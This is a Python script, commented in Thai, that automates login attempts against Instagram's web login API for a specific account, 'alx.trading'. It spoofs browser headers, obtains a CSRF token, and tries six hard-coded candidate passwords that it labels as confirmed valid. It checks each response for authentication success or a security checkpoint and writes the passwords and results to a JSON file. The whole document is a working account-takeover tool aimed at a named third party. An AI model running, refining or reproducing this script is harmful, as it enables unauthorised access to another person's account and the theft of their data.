#!/usr/bin/env python3
"""
Current Instagram Response Test
ทดสอบการตอบสนองปัจจุบันของ Instagram กับรหัสผ่านที่ถูกต้อง
"""

import requests
import json
import time
from datetime import datetime

class InstagramResponseTester:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.instagram.com"
        self.login_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
        
        # Headers ที่เลียนแบบ browser จริง
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'X-Instagram-AJAX': '1',
            'X-CSRFToken': '',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
        self.valid_passwords = [
            "Fleming654",
            "Fleming786", 
            "Fleming1004",
            "Fleming1060",
            "Fleming1182",
            "Fleming1998"
        ]
        
    def get_csrf_token(self):
        """ดึง CSRF token จาก Instagram"""
        try:
            print("🔄 Getting CSRF token...")
            response = self.session.get(self.base_url + "/accounts/login/", headers=self.headers)
            
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']
                print(f"✅ CSRF Token obtained: {csrf_token[:20]}...")
                return csrf_token
            else:
                print("❌ No CSRF token found in cookies")
                return None
                
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
            return None
    
    def test_login_response(self, username, password):
        """ทดสอบการตอบสนองของการ login"""
        print(f"\n🎯 Testing login: {username} / {password}")
        
        # ดึง CSRF token ใหม่
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return None
            
        self.headers['X-CSRFToken'] = csrf_token
        
        # ข้อมูล login
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        
        try:
            print("📤 Sending login request...")
            response = self.session.post(
                self.login_url,
                data=login_data,
                headers=self.headers,
                allow_redirects=False
            )
            
            # วิเคราะห์ response
            result = {
                'timestamp': datetime.now().isoformat(),
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': dict(response.cookies),
                'raw_text': response.text[:1000] if response.text else "",
                'url': response.url
            }
            
            # พยายาม parse JSON
            try:
                json_data = response.json()
                result['json_response'] = json_data
                print(f"📊 JSON Response: {json_data}")
            except:
                result['json_response'] = None
                print("⚠️ Response is not JSON")
            
            # วิเคราะห์ status
            print(f"📊 Status Code: {response.status_code}")
            print(f"📊 Content Length: {len(response.text)}")
            
            # ตรวจสอบ checkpoint patterns
            text_lower = response.text.lower()
            if 'checkpoint' in text_lower:
                print("🔍 CHECKPOINT detected in response!")
                result['checkpoint_detected'] = True
            else:
                print("⚪ No checkpoint pattern found")
                result['checkpoint_detected'] = False
                
            # ตรวจสอบ success patterns
            if 'authenticated' in text_lower and 'true' in text_lower:
                print("✅ AUTHENTICATION SUCCESS detected!")
                result['auth_success'] = True
            else:
                result['auth_success'] = False
                
            return result
            
        except Exception as e:
            print(f"❌ Login test error: {e}")
            return None
    
    def run_comprehensive_test(self):
        """รันการทดสอบครบถ้วน"""
        print("🚀 Starting Comprehensive Instagram Response Test")
        print("=" * 60)
        
        results = []
        target_username = "alx.trading"
        
        for i, password in enumerate(self.valid_passwords, 1):
            print(f"\n📋 Test {i}/{len(self.valid_passwords)}")
            print("-" * 40)
            
            result = self.test_login_response(target_username, password)
            if result:
                results.append(result)
                
            # หน่วงเวลาระหว่างการทดสอบ
            if i < len(self.valid_passwords):
                print("⏱️ Waiting 3 seconds...")
                time.sleep(3)
        
        # บันทึกผลลัพธ์
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"instagram_response_analysis_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Results saved to: {filename}")
        
        # สรุปผลลัพธ์
        print("\n📊 ANALYSIS SUMMARY")
        print("=" * 60)
        
        checkpoint_count = sum(1 for r in results if r.get('checkpoint_detected', False))
        auth_success_count = sum(1 for r in results if r.get('auth_success', False))
        status_codes = [r['status_code'] for r in results]
        
        print(f"🎯 Total tests: {len(results)}")
        print(f"🔍 Checkpoint detected: {checkpoint_count}")
        print(f"✅ Auth success: {auth_success_count}")
        print(f"📊 Status codes: {set(status_codes)}")
        
        # แสดง response patterns
        print(f"\n📋 RESPONSE PATTERNS:")
        for i, result in enumerate(results, 1):
            print(f"{i}. {result['password']}: Status {result['status_code']} - Checkpoint: {result['checkpoint_detected']}")
        
        return results

if __name__ == "__main__":
    tester = InstagramResponseTester()
    results = tester.run_comprehensive_test()
